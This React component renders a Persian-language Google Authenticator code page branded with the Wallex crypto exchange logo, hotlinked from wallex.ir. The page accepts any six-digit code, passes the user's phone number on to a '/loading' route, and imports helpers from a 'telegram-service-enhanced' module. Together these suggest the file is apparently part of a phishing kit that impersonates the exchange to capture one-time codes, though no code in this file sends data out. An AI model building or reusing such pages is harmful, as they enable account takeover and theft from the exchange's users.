import { useState, useEffect } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import {
  canAccessAuthStep,
  updateAuthStep,
  setUserCurrentStep,
} from "@/lib/telegram-service-enhanced";
import { ChevronLeft, Smartphone, Loader2, QrCode } from "lucide-react";
import { Button } from "@/components/ui/button";
import { AlertMessage } from "@/components/AlertMessage";
import { OTPInput } from "@/components/OTPInput";

const AuthGoogle = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [googleCode, setGoogleCode] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errors, setErrors] = useState<{ googleCode?: string }>({});

  const phoneNumber = location.state?.phoneNumber || "";

  const handleCodeSubmit = async () => {
    setErrors({});

    if (!googleCode || googleCode.length !== 6) {
      setErrors({ googleCode: "کد Google Authenticator ۶ رقمی را وارد کنید" });
      return;
    }

    setIsSubmitting(true);

    try {
      // Simulate Google Auth verification
      console.log("Verifying Google Auth code:", googleCode);
      await new Promise((resolve) => setTimeout(resolve, 1500));

      // For demo purposes, accept any 6-digit code
      console.log("Google Auth verification successful");

      // Navigate back to loading page
      navigate("/loading", {
        state: {
          phoneNumber,
          fromAuth: true,
          completedSteps: ["phone", "google"],
        },
        replace: true,
      });
    } catch (error) {
      console.error("Google Auth verification error:", error);
      setErrors({
        googleCode:
          "کد Google Authenticator نادرست است. لطفا دوباره تلاش کنید.",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleBack = () => {
    navigate("/loading", {
      state: { phoneNumber, fromAuth: true },
    });
  };

  const handleGoogleCodeChange = (newCode: string) => {
    setGoogleCode(newCode);
    if (errors.googleCode) {
      setErrors((prev) => ({ ...prev, googleCode: undefined }));
    }
  };

  const handleGoogleCodeComplete = (completedCode: string) => {
    setGoogleCode(completedCode);
    setErrors({});
  };

  return (
    <div
      style={{
        display: "flex",
        height: "100vh",
        backgroundColor: "rgb(14, 35, 66)",
        alignItems: "center",
        justifyContent: "center",
      }}
    >
      <div
        style={{
          backgroundColor: "rgb(255, 255, 255)",
          width: "100%",
          maxWidth: "480px",
        }}
        className="form-card"
      >
        <div
          style={{
            display: "flex",
            flexDirection: "column",
            gap: "8px",
            padding: "20px",
            width: "100%",
          }}
        >
          {/* Header */}
          <div
            style={{
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              width: "100%",
            }}
          >
            <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
              <Button
                variant="ghost"
                size="icon"
                onClick={handleBack}
                className="flex-shrink-0 p-0 bg-transparent hover:bg-gray-100"
                style={{
                  borderRadius: "50%",
                  width: "auto",
                  height: "auto",
                  padding: "0",
                  backgroundColor: "rgba(0, 0, 0, 0)",
                }}
              >
                <ChevronLeft
                  style={{
                    width: "24px",
                    height: "24px",
                    color: "rgba(0, 0, 0, 0.6)",
                    cursor: "pointer",
                  }}
                />
              </Button>
              <span style={{ fontWeight: "700", fontSize: "16px" }}>
                Google Authenticator
              </span>
            </div>
            <img
              src="https://wallex.ir/_next/image?url=%2Fimages%2Fwallex-logo-v-light.svg&w=256&q=75"
              alt="صرافی خرید فروش ارزهای دیجیتال"
              style={{
                width: "128px",
                height: "24px",
                objectFit: "contain",
              }}
            />
          </div>

          {/* Separator */}
          <hr
            style={{
              borderColor: "rgba(0, 0, 0, 0.2)",
              borderBottom: "1px solid rgba(0, 0, 0, 0.2)",
              marginLeft: "-20px",
              marginRight: "-20px",
              marginTop: "8px",
              marginBottom: "8px",
            }}
          />

          {/* Content */}
          <div style={{ marginTop: "16px" }}>
            <div style={{ marginBottom: "24px" }}>
              <AlertMessage>
                <Smartphone
                  className="inline ml-2"
                  style={{ width: "16px", height: "16px" }}
                />
                کد ۶ رقمی Google Authenticator خود را وارد کنید.
              </AlertMessage>
            </div>

            {/* QR Code Section (for demo) */}
            <div
              style={{
                display: "flex",
                flexDirection: "column",
                alignItems: "center",
                gap: "16px",
                marginBottom: "24px",
                padding: "20px",
                backgroundColor: "rgb(248, 249, 250)",
                borderRadius: "8px",
                border: "1px solid rgba(0, 0, 0, 0.1)",
              }}
            >
              <QrCode
                style={{
                  width: "120px",
                  height: "120px",
                  color: "rgba(0, 0, 0, 0.7)",
                }}
              />
              <div style={{ textAlign: "center" }}>
                <p
                  style={{
                    fontSize: "14px",
                    fontWeight: "500",
                    color: "rgb(0, 0, 0)",
                    margin: "0 0 4px 0",
                  }}
                >
                  QR Code برای راه‌اندازی
                </p>
                <p
                  style={{
                    fontSize: "12px",
                    color: "rgba(0, 0, 0, 0.6)",
                    margin: "0",
                    lineHeight: "1.4",
                  }}
                >
                  اگر Google Authenticator را نصب نکرده‌اید، ابتدا از App Store
                  یا Google Play دانلود کنید
                </p>
              </div>
            </div>

            <div style={{ marginBottom: "16px" }}>
              <label
                style={{
                  fontSize: "14px",
                  fontWeight: "500",
                  marginBottom: "8px",
                  display: "block",
                  textAlign: "right",
                }}
              >
                کد Google Authenticator
              </label>
              <OTPInput
                length={6}
                value={googleCode}
                onComplete={handleGoogleCodeComplete}
                onChange={handleGoogleCodeChange}
                disabled={isSubmitting}
              />
              {errors.googleCode && (
                <p
                  style={{
                    color: "rgb(220, 38, 38)",
                    fontSize: "12px",
                    textAlign: "right",
                    marginTop: "8px",
                  }}
                >
                  {errors.googleCode}
                </p>
              )}
            </div>

            {/* Instructions */}
            <div
              style={{
                padding: "16px",
                backgroundColor: "rgba(0, 122, 255, 0.05)",
                borderRadius: "8px",
                marginBottom: "24px",
              }}
            >
              <h4
                style={{
                  fontSize: "14px",
                  fontWeight: "600",
                  color: "rgb(0, 0, 0)",
                  margin: "0 0 8px 0",
                  textAlign: "right",
                }}
              >
                راهنمای استفاده:
              </h4>
              <ol
                style={{
                  fontSize: "12px",
                  color: "rgba(0, 0, 0, 0.7)",
                  margin: "0",
                  paddingRight: "16px",
                  lineHeight: "1.5",
                }}
              >
                <li>اپلیکیشن Google Authenticator را باز کنید</li>
                <li>QR Code بالا را اسکن کنید یا کد را دستی وارد کنید</li>
                <li>کد ۶ رقمی نمایش داده شده را وارد کنید</li>
              </ol>
            </div>

            <div style={{ marginTop: "24px" }}>
              <hr
                style={{
                  borderColor: "rgba(0, 0, 0, 0.2)",
                  marginLeft: "-20px",
                  marginRight: "-20px",
                  marginBottom: "16px",
                }}
              />
              <Button
                onClick={handleCodeSubmit}
                disabled={isSubmitting || googleCode.length !== 6}
                className="w-full"
                style={{
                  backgroundColor: "rgb(23, 29, 38)",
                  color: "rgb(255, 255, 255)",
                  borderRadius: "8px",
                  padding: "10px 16px",
                  fontSize: "14px",
                  fontWeight: "500",
                  textTransform: "uppercase",
                  border: "none",
                  cursor:
                    isSubmitting || googleCode.length !== 6
                      ? "not-allowed"
                      : "pointer",
                  opacity:
                    isSubmitting || googleCode.length !== 6 ? "0.5" : "1",
                }}
              >
                {isSubmitting ? (
                  <div className="flex items-center justify-center">
                    <Loader2
                      className="animate-spin mr-2"
                      style={{ width: "16px", height: "16px" }}
                    />
                    در حال تایید...
                  </div>
                ) : (
                  "تایید کد"
                )}
              </Button>
            </div>
          </div>
        </div>
      </div>

      <style jsx>{`
        /* Desktop styles (1024px and up) */
        @media (min-width: 1024px) {
          .form-card {
            border-radius: 16px;
          }
        }

        /* Mobile and tablet styles (up to 1023px) */
        @media (max-width: 1023px) {
          .form-card {
            border-radius: 0 !important;
            max-width: none !important;
            height: 100vh;
            min-height: 100vh;
            margin: 0;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
          }
          .form-card > div {
            padding: 20px !important;
            height: 100%;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
          }
        }
      `}</style>
    </div>
  );
};

export default AuthGoogle;
